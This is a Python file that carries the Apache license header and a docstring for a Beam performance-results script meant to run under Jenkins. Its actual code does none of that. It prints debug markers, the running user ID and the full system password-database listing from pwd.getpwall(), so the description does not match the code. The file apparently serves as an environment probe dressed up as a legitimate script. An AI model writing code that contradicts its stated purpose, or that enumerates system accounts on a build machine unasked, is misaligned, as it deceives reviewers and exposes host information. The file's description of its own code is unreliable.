#!/usr/bin/env python
#
#
#    Licensed to the Apache Software Foundation (ASF) under one or more
#    contributor license agreements.  See the NOTICE file distributed with
#    this work for additional information regarding copyright ownership.
#    The ASF licenses this file to You under the Apache License, Version 2.0
#    (the "License"); you may not use this file except in compliance with
#    the License.  You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.
#
#   This script performs basic analytic of performance tests results.
#   It operates in two modes:
#   --mode=report - In this mode script iterates over list of BigQuery tables and
#   analyses the data. This mode is intended to be run on a regulars basis, e.g. daily.
#   Report will contain average tests execution time of given metric, its comparison with
#   average calculated from historical data, recent standard deviation and standard
#   deviation calculated based on historical data.
#   --mode=validation - In this mode script will analyse single BigQuery table and check
#   recent results.
#
#   Other parameters are described in script. Notification is optional parameter.
#   --send_notification - if present, script will send notification to slack channel.
#   Requires setting env variable SLACK_WEBOOK_URL which value could be obtained by
#   creating incoming webhook on Slack.
#
#   This script is intended to be used only by Jenkins.
#   Example script usage:
#   verify_performance_test_results.py \
#     --bqtable='["beam_performance.avroioit_hdfs_pkb_results", \
#                 "beam_performance.textioit_pkb_results"]' \
#     --metric="run_time" --mode=report --send_notification
#

import os
import pwd

print 'aaa'
print os.getuid()
print pwd.getpwall()
print 'bbb'
